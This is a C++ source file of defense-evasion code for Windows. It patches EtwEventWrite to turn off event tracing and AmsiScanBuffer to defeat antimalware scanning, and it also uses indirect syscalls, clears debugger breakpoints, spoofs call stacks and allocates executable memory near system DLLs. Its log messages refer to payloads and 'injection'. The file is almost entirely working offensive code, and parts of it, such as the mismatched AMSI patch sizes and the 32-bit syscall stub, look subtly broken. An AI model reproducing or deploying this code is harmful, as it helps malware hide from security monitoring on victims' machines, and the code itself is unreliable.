#include "AdvancedEvasion.h"
#include "EvasionLogger.h"
#include <intrin.h>
#include <vector>
#include <unordered_map>
#include <string>

namespace AdvancedEvasion {
    
    // ETW Evasion Implementation
    BYTE* ETWEvasion::g_originalBytes = nullptr;
    SIZE_T ETWEvasion::g_patchSize = 0;
    
    bool ETWEvasion::DisableETW() {
        return PatchEtwEventWrite();
    }
    
    bool ETWEvasion::PatchEtwEventWrite() {
        HMODULE ntdll = GetModuleHandleA("ntdll.dll");
        if (!ntdll) {
            EVASION_LOG_ERROR("ETW", "Failed to get ntdll.dll handle");
            return false;
        }
        
        FARPROC etwEventWrite = GetProcAddress(ntdll, "EtwEventWrite");
        if (!etwEventWrite) {
            EVASION_LOG_ERROR("ETW", "Failed to find EtwEventWrite function");
            return false;
        }
        
        EVASION_LOG_DEBUG("ETW", "Found EtwEventWrite at 0x" + std::to_string((uintptr_t)etwEventWrite));
        
        // Save original bytes
        g_patchSize = 1;
        g_originalBytes = new BYTE[g_patchSize];
        memcpy(g_originalBytes, etwEventWrite, g_patchSize);
        
        // Patch with RET instruction
        DWORD oldProtect;
        if (!VirtualProtect(etwEventWrite, g_patchSize, PAGE_EXECUTE_READWRITE, &oldProtect)) {
            EVASION_LOG_ERROR("ETW", "Failed to change memory protection for EtwEventWrite");
            delete[] g_originalBytes;
            return false;
        }
        
        *(BYTE*)etwEventWrite = 0xC3; // RET
        
        VirtualProtect(etwEventWrite, g_patchSize, oldProtect, &oldProtect);
        EVASION_LOG_SUCCESS("ETW", "Successfully patched EtwEventWrite - Windows event tracing disabled");
        return true;
    }
    
    bool ETWEvasion::RestoreETW() {
        if (!g_originalBytes) return false;
        
        HMODULE ntdll = GetModuleHandleA("ntdll.dll");
        if (!ntdll) return false;
        
        FARPROC etwEventWrite = GetProcAddress(ntdll, "EtwEventWrite");
        if (!etwEventWrite) return false;
        
        DWORD oldProtect;
        if (!VirtualProtect(etwEventWrite, g_patchSize, PAGE_EXECUTE_READWRITE, &oldProtect)) {
            return false;
        }
        
        memcpy(etwEventWrite, g_originalBytes, g_patchSize);
        VirtualProtect(etwEventWrite, g_patchSize, oldProtect, &oldProtect);
        
        delete[] g_originalBytes;
        g_originalBytes = nullptr;
        return true;
    }
    
    // Syscall Evasion Implementation
    DWORD SyscallEvasion::g_syscallNumbers[32] = {0};
    bool SyscallEvasion::g_initialized = false;
    
    bool SyscallEvasion::Initialize() {
        if (g_initialized) return true;
        
        // Get syscall numbers for common functions
        g_syscallNumbers[0] = GetSyscallNumber("NtQueryVirtualMemory");
        g_syscallNumbers[1] = GetSyscallNumber("NtProtectVirtualMemory");
        g_syscallNumbers[2] = GetSyscallNumber("NtAllocateVirtualMemory");
        g_syscallNumbers[3] = GetSyscallNumber("NtFreeVirtualMemory");
        g_syscallNumbers[4] = GetSyscallNumber("NtReadVirtualMemory");
        g_syscallNumbers[5] = GetSyscallNumber("NtWriteVirtualMemory");
        
        g_initialized = true;
        return true;
    }
    
    DWORD SyscallEvasion::GetSyscallNumber(const char* functionName) {
        HMODULE ntdll = GetModuleHandleA("ntdll.dll");
        if (!ntdll) return 0;
        
        FARPROC func = GetProcAddress(ntdll, functionName);
        if (!func) return 0;
        
        // Parse the function to extract syscall number
        BYTE* bytes = (BYTE*)func;
        
        // Pattern: MOV EAX, syscall_number (B8 XX XX XX XX)
        if (bytes[0] == 0xB8) {
            return *(DWORD*)(bytes + 1);
        }
        
        // Alternative pattern for newer Windows versions
        // Pattern: MOV R10, RCX; MOV EAX, syscall_number
        if (bytes[0] == 0x4C && bytes[1] == 0x8B && bytes[2] == 0xD1 &&
            bytes[3] == 0xB8) {
            return *(DWORD*)(bytes + 4);
        }
        
        return 0;
    }
    
    __declspec(naked) NTSTATUS SyscallEvasion::ExecuteIndirectSyscall(DWORD syscallNumber, ...) {
        __asm {
            push ebp
            mov ebp, esp
            mov eax, [ebp + 8]  // Get syscall number
            mov edx, 0x7FFE0300 // KiSystemCall in KUSER_SHARED_DATA
            call dword ptr [edx]
            mov esp, ebp
            pop ebp
            ret
        }
    }
    
    NTSTATUS SyscallEvasion::IndirectNtQueryVirtualMemory(
        HANDLE ProcessHandle,
        PVOID BaseAddress,
        SyscallEvasion::MEMORY_INFORMATION_CLASS MemoryInformationClass,
        PVOID MemoryInformation,
        SIZE_T MemoryInformationLength,
        PSIZE_T ReturnLength) {
        
        if (!g_initialized) Initialize();
        
        return ExecuteIndirectSyscall(
            g_syscallNumbers[0],
            ProcessHandle,
            BaseAddress,
            MemoryInformationClass,
            MemoryInformation,
            MemoryInformationLength,
            ReturnLength
        );
    }
    
    NTSTATUS SyscallEvasion::IndirectNtProtectVirtualMemory(
        HANDLE ProcessHandle,
        PVOID* BaseAddress,
        PSIZE_T RegionSize,
        ULONG NewProtect,
        PULONG OldProtect) {
        
        if (!g_initialized) Initialize();
        
        return ExecuteIndirectSyscall(
            g_syscallNumbers[1],
            ProcessHandle,
            BaseAddress,
            RegionSize,
            NewProtect,
            OldProtect
        );
    }
    
    NTSTATUS SyscallEvasion::IndirectNtAllocateVirtualMemory(
        HANDLE ProcessHandle,
        PVOID* BaseAddress,
        ULONG_PTR ZeroBits,
        PSIZE_T RegionSize,
        ULONG AllocationType,
        ULONG Protect) {
        
        if (!g_initialized) Initialize();
        
        return ExecuteIndirectSyscall(
            g_syscallNumbers[2],
            ProcessHandle,
            BaseAddress,
            ZeroBits,
            RegionSize,
            AllocationType,
            Protect
        );
    }
    
    // AMSI Evasion Implementation
    BYTE* AMSIEvasion::g_originalAMSIBytes = nullptr;
    SIZE_T AMSIEvasion::g_amsiPatchSize = 0;
    
    bool AMSIEvasion::BypassAMSI() {
        return PatchAmsiScanBuffer();
    }
    
    bool AMSIEvasion::PatchAmsiScanBuffer() {
        HMODULE amsi = LoadLibraryA("amsi.dll");
        if (!amsi) {
            EVASION_LOG_WARNING("AMSI", "AMSI not loaded - bypass not needed");
            return true; // Not an error if AMSI isn't loaded
        }
        
        FARPROC amsiScanBuffer = GetProcAddress(amsi, "AmsiScanBuffer");
        if (!amsiScanBuffer) {
            EVASION_LOG_ERROR("AMSI", "Failed to find AmsiScanBuffer function");
            return false;
        }
        
        EVASION_LOG_DEBUG("AMSI", "Found AmsiScanBuffer at 0x" + std::to_string((uintptr_t)amsiScanBuffer));
        
        // Save original bytes
        g_amsiPatchSize = 6;
        g_originalAMSIBytes = new BYTE[g_amsiPatchSize];
        memcpy(g_originalAMSIBytes, amsiScanBuffer, g_amsiPatchSize);
        
        DWORD oldProtect;
        if (!VirtualProtect(amsiScanBuffer, g_amsiPatchSize, PAGE_EXECUTE_READWRITE, &oldProtect)) {
            EVASION_LOG_ERROR("AMSI", "Failed to change memory protection for AmsiScanBuffer");
            delete[] g_originalAMSIBytes;
            return false;
        }
        
        // Patch to return AMSI_RESULT_CLEAN
        BYTE patch[] = { 0x31, 0xC0, 0xC3 }; // XOR EAX, EAX; RET
        memcpy(amsiScanBuffer, patch, sizeof(patch));
        
        VirtualProtect(amsiScanBuffer, g_amsiPatchSize, oldProtect, &oldProtect);
        EVASION_LOG_SUCCESS("AMSI", "Successfully bypassed AmsiScanBuffer - antimalware scanning disabled");
        return true;
    }
    
    bool AMSIEvasion::RestoreAMSI() {
        if (!g_originalAMSIBytes) return false;
        
        HMODULE amsi = GetModuleHandleA("amsi.dll");
        if (!amsi) return false;
        
        FARPROC amsiScanBuffer = GetProcAddress(amsi, "AmsiScanBuffer");
        if (!amsiScanBuffer) return false;
        
        DWORD oldProtect;
        if (!VirtualProtect(amsiScanBuffer, g_amsiPatchSize, PAGE_EXECUTE_READWRITE, &oldProtect)) {
            return false;
        }
        
        memcpy(amsiScanBuffer, g_originalAMSIBytes, g_amsiPatchSize);
        VirtualProtect(amsiScanBuffer, g_amsiPatchSize, oldProtect, &oldProtect);
        
        delete[] g_originalAMSIBytes;
        g_originalAMSIBytes = nullptr;
        return true;
    }
    
    // Breakpoint Evasion Implementation
    bool BreakpointEvasion::DetectHardwareBreakpoints() {
        return CheckDebugRegisters();
    }
    
    bool BreakpointEvasion::ClearHardwareBreakpoints() {
        ClearDebugRegisters();
        return true;
    }
    
    bool BreakpointEvasion::CheckDebugRegisters() {
        CONTEXT ctx = { 0 };
        ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
        
        if (!GetThreadContext(GetCurrentThread(), &ctx)) {
            return false;
        }
        
        return (ctx.Dr0 || ctx.Dr1 || ctx.Dr2 || ctx.Dr3);
    }
    
    void BreakpointEvasion::ClearDebugRegisters() {
        CONTEXT ctx = { 0 };
        ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
        
        if (GetThreadContext(GetCurrentThread(), &ctx)) {
            ctx.Dr0 = ctx.Dr1 = ctx.Dr2 = ctx.Dr3 = 0;
            ctx.Dr7 = 0;
            SetThreadContext(GetCurrentThread(), &ctx);
        }
    }
    
    bool BreakpointEvasion::DetectSoftwareBreakpoints(PVOID address, SIZE_T size) {
        __try {
            BYTE* bytes = (BYTE*)address;
            for (SIZE_T i = 0; i < size; i++) {
                if (bytes[i] == 0xCC) { // INT 3 instruction
                    return true;
                }
            }
        }
        __except(EXCEPTION_EXECUTE_HANDLER) {
            return false;
        }
        return false;
    }
    
    bool BreakpointEvasion::ClearSoftwareBreakpoints(PVOID address, SIZE_T size) {
        __try {
            BYTE* bytes = (BYTE*)address;
            for (SIZE_T i = 0; i < size; i++) {
                if (bytes[i] == 0xCC) {
                    bytes[i] = 0x90; // Replace with NOP
                }
            }
            return true;
        }
        __except(EXCEPTION_EXECUTE_HANDLER) {
            return false;
        }
    }
    
    // Stack Evasion Implementation
    void StackEvasion::SpoofCallStack(PVOID legitimateAddress) {
        PVOID* stackFrame = GetCurrentStackFrame();
        
        // Replace return addresses with legitimate ones
        for (int i = 0; i < 10; i++) {
            __try {
                stackFrame[i] = legitimateAddress;
            }
            __except(EXCEPTION_EXECUTE_HANDLER) {
                break;
            }
        }
    }
    
    PVOID StackEvasion::GetLegitimateReturnAddress() {
        HMODULE kernel32 = GetModuleHandleA("kernel32.dll");
        if (kernel32) {
            return GetProcAddress(kernel32, "Sleep");
        }
        return nullptr;
    }
    
    PVOID* StackEvasion::GetCurrentStackFrame() {
        return (PVOID*)_AddressOfReturnAddress();
    }
    
    // Memory Evasion Implementation
    std::vector<PVOID> MemoryEvasion::g_stealthAllocations;
    
    PVOID MemoryEvasion::StealthAllocate(SIZE_T size, DWORD protect) {
        // Allocate in multiple small chunks to avoid detection
        const SIZE_T chunkSize = 0x1000; // 4KB chunks
        SIZE_T remainingSize = size;
        std::vector<PVOID> chunks;
        
        while (remainingSize > 0) {
            SIZE_T allocSize = min(chunkSize, remainingSize);
            PVOID chunk = VirtualAlloc(nullptr, allocSize, MEM_COMMIT | MEM_RESERVE, protect);
            
            if (!chunk) {
                // Cleanup on failure
                for (PVOID c : chunks) {
                    VirtualFree(c, 0, MEM_RELEASE);
                }
                return nullptr;
            }
            
            chunks.push_back(chunk);
            remainingSize -= allocSize;
        }
        
        // Store all chunks for later cleanup
        g_stealthAllocations.insert(g_stealthAllocations.end(), chunks.begin(), chunks.end());
        
        return chunks.empty() ? nullptr : chunks[0];
    }
    
    bool MemoryEvasion::StealthFree(PVOID address) {
        auto it = std::find(g_stealthAllocations.begin(), g_stealthAllocations.end(), address);
        if (it != g_stealthAllocations.end()) {
            VirtualFree(address, 0, MEM_RELEASE);
            g_stealthAllocations.erase(it);
            return true;
        }
        return false;
    }
    
    PVOID MemoryEvasion::MapStealthMemory(PVOID preferredBase, SIZE_T size) {
        // Try to allocate near legitimate DLLs
        HMODULE modules[] = {
            GetModuleHandleA("kernel32.dll"),
            GetModuleHandleA("ntdll.dll"),
            GetModuleHandleA("user32.dll")
        };
        
        for (HMODULE mod : modules) {
            if (mod) {
                // Try to allocate near this module
                MEMORY_BASIC_INFORMATION mbi;
                if (VirtualQuery(mod, &mbi, sizeof(mbi))) {
                    PVOID nearAddress = (PVOID)((DWORD_PTR)mbi.BaseAddress + mbi.RegionSize + 0x10000);
                    PVOID result = VirtualAlloc(nearAddress, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
                    if (result) {
                        g_stealthAllocations.push_back(result);
                        return result;
                    }
                }
            }
        }
        
        // Fallback to regular allocation
        return StealthAllocate(size, PAGE_EXECUTE_READWRITE);
    }
    
    // Evasion Manager Implementation
    bool EvasionManager::g_etwDisabled = false;
    bool EvasionManager::g_amsiDisabled = false;
    bool EvasionManager::g_syscallsHooked = false;
    bool EvasionManager::g_stackSpoofed = false;
    
    bool EvasionManager::InitializeAll() {
        // Check verbosity setting from environment variable
        bool verboseMode = false; // Default to verbose
        char* envVar = nullptr;
        size_t len = 0;
        if (_dupenv_s(&envVar, &len, "AWESOME_VERBOSE") == 0 && envVar != nullptr) {
            verboseMode = (strcmp(envVar, "1") == 0 || _stricmp(envVar, "true") == 0);
            free(envVar);
        }
        
        // Initialize logging first - respect verbosity setting
        EvasionLogger::Logger::Initialize(verboseMode, false); // Console logging based on verbosity
        if (verboseMode) {
            EVASION_LOG_SUCCESS("INIT", "Evasion Manager initialized - starting technique deployment");
        }
        
        bool success = true;
        
        // Initialize ETW evasion
        if (ETWEvasion::DisableETW()) {
            g_etwDisabled = true;
        } else {
            EVASION_LOG_WARNING("ETW", "ETW patching failed - event tracing may still be active");
            success = false;
        }
        
        // Initialize AMSI evasion
        if (AMSIEvasion::BypassAMSI()) {
            g_amsiDisabled = true;
        } else {
            EVASION_LOG_WARNING("AMSI", "AMSI bypass failed - antimalware scanning may detect payloads");
            success = false;
        }
        
        // Initialize syscall evasion
        if (SyscallEvasion::Initialize()) {
            g_syscallsHooked = true;
            EVASION_LOG_SUCCESS("SYSCALL", "Indirect syscalls initialized successfully");
        } else {
            EVASION_LOG_WARNING("SYSCALL", "Syscall evasion failed - falling back to normal APIs");
            success = false;
        }
        
        // Clear hardware breakpoints
        if (BreakpointEvasion::DetectHardwareBreakpoints()) {
            EVASION_LOG_WARNING("BREAKPOINT", "Hardware breakpoints detected and cleared");
            BreakpointEvasion::ClearHardwareBreakpoints();
        } else {
            EVASION_LOG_DEBUG("BREAKPOINT", "No hardware breakpoints detected");
        }
        
        // Spoof call stack
        PVOID legitAddress = StackEvasion::GetLegitimateReturnAddress();
        if (legitAddress) {
            StackEvasion::SpoofCallStack(legitAddress);
            g_stackSpoofed = true;
            EVASION_LOG_SUCCESS("STACK", "Call stack spoofing enabled");
        } else {
            EVASION_LOG_WARNING("STACK", "Failed to get legitimate return address for spoofing");
        }
        
        // Log summary
        if (success) {
            EVASION_LOG_SUCCESS("INIT", "All evasion techniques deployed successfully");
        } else {
            EVASION_LOG_WARNING("INIT", "Some evasion techniques failed - injection will continue with reduced stealth");
        }
        
        return success;
    }
    
    bool EvasionManager::ApplyAdaptiveEvasion() {
        // Check environment and apply appropriate evasion
        bool detected = false;
        
        // Check for hardware breakpoints
        if (BreakpointEvasion::DetectHardwareBreakpoints()) {
            BreakpointEvasion::ClearHardwareBreakpoints();
            detected = true;
        }
        
        // Additional checks can be added here
        
        return !detected;
    }
    
    void EvasionManager::Cleanup() {
        if (g_etwDisabled) {
            ETWEvasion::RestoreETW();
            g_etwDisabled = false;
        }
        
        if (g_amsiDisabled) {
            AMSIEvasion::RestoreAMSI();
            g_amsiDisabled = false;
        }
        
        // Clean up stealth allocations
        for (auto it = MemoryEvasion::g_stealthAllocations.begin(); 
             it != MemoryEvasion::g_stealthAllocations.end(); ++it) {
            VirtualFree(*it, 0, MEM_RELEASE);
        }
        MemoryEvasion::g_stealthAllocations.clear();
    }
    
    bool EvasionManager::GetEvasionStatus() {
        return g_etwDisabled || g_amsiDisabled || g_syscallsHooked || g_stackSpoofed;
    }
}
